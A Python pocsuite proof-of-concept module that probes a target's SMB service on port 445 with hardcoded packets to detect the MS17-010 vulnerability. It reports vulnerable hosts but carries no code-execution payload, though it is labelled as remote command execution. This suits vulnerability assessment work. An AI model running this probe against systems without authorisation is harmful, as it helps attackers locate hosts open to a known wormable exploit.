#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : jeffzhang
# @Time    : 2018/04/19
# @File    : _170605_SMB_ms17_010_RCE.py
# @Desc    : ""

import binascii
import socket
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '00005'
    version = '1'
    author = 'jeffzhang'
    vulDate = '2017-05-12'
    createDate = '2018-04-19'
    updateDate = '2018-04-19'
    references = ['']
    name = 'MS17-010 SMB 远程命令执行漏洞'
    appPowerLink = 'https://www.microsoft.com'
    appName = 'SMB Server'
    appVersion = 'All'
    vulType = 'RCE'
    desc = '''
            SMB Server存在多个远程执行代码漏洞 成功利用这些漏洞的攻击者可以获取在目标系统上执行代码的能力
    '''
    samples = ['']

    def _verify(self):
        result = {}
        target_ip = self.url.split(':')[1].strip('/')
        if len(self.url.split(':')) > 2:
            target_port = int(self.url.split(':')[2].strip('/'))
        else:
            target_port = 445
        negotiate_protocol_request = binascii.unhexlify("00000054ff534d4272000000001801280000000000000000000000000000"
                                                        "2f4b0000c55e003100024c414e4d414e312e3000024c4d312e3258303032"
                                                        "00024e54204c414e4d414e20312e3000024e54204c4d20302e313200")

        session_setup_request = binascii.unhexlify("00000063ff534d42730000000018012000000000000000000000000000002f4b0"
                                                   "000c55e0dff000000dfff02000100000000000000000000000000400000002600"
                                                   "002e0057696e646f7773203230303020323139350057696e646f7773203230303"
                                                   "020352e3000")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, target_port))
            s.send(negotiate_protocol_request)
            s.recv(1024)
            s.send(session_setup_request)
            data = s.recv(1024)
            user_id = data[32:34]
            tree_connect_andx_request = "000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff00" \
                                        "0000000001001a00005c5c%s5c49504324003f3f3f3f3f00" % (
            (58 + len(target_ip)), user_id.encode('hex'), target_ip.encode('hex'))
            s.send(binascii.unhexlify(tree_connect_andx_request))
            data = s.recv(1024)
            all_id = data[28:36]
            payload = "0000004aff534d422500000000180128000000000000000000000000%s1000000000ffffffff000000000000000000" \
                      "0000004a0000004a0002002300000007005c504950455c00" % all_id.encode('hex')
            s.send(binascii.unhexlify(payload))
            data = s.recv(1024)
            s.close()
            if "\x05\x02\x00\xc0" in data:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = payload[:20]
                result['VerifyInfo']['result'] = data[:20]
        except Exception as e:
            pass
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet noting return')
        return output


register(TestPOC)